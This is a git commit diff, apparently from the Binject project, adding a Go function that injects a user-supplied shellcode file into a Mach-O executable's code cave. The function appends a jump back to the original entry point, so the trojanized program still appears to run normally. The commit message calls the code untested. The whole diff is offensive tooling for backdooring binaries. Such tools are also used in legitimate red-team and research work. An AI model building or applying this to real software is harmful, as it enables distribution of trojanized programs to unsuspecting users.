6290107e1ba13d0c16d863c311d0c89a36f85a30
awgh <awgh@awgh.org>
2019-03-29 23:23:10 -0700

    Implemented injection for Mach-O.  Untested, needs unit tests.

--- bj/inject_macho.go
+++ bj/inject_macho.go
@@ -1,16 +1,24 @@
 package bj
 
 import (
-	"debug/macho"
+	"io/ioutil"
 	"log"
+
+	"github.com/Binject/debug/macho"
+	"github.com/Binject/shellcode/api"
 )
 
 // MachoBinject - Inject shellcode into an Mach-O binary
-func MachoBinject(sourceFile string, destFile string, shellcode string, config *BinjectConfig) error {
+func MachoBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {
+
+	userShellCode, err := ioutil.ReadFile(shellcodeFile)
+	if err != nil {
+		return err
+	}
+
 	//
 	// BEGIN CODE CAVE DETECTION SECTION
 	//
-
 	machoFile, err := macho.Open(sourceFile)
 	if err != nil {
 		return err
@@ -19,12 +27,15 @@ func MachoBinject(sourceFile string, destFile string, shellcode string, config *
 		if section.SectionHeader.Seg == "__TEXT" && section.Name == "__text" {
 			caveOffset := 0x20 /* magic value */ + machoFile.FileHeader.Cmdsz
 			log.Printf("Code Cave Size: %x - %x = %x\n", section.Offset, caveOffset, section.Offset-caveOffset)
+			//
+			// END CODE CAVE DETECTION SECTION
+			//
+
+			shellcode := api.ApplySuffixJmpIntel64(userShellCode, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
+			machoFile.Insertion = shellcode
+			break
 		}
 	}
-
-	//
-	// END CODE CAVE DETECTION SECTION
-	//
 
 	return nil
 }
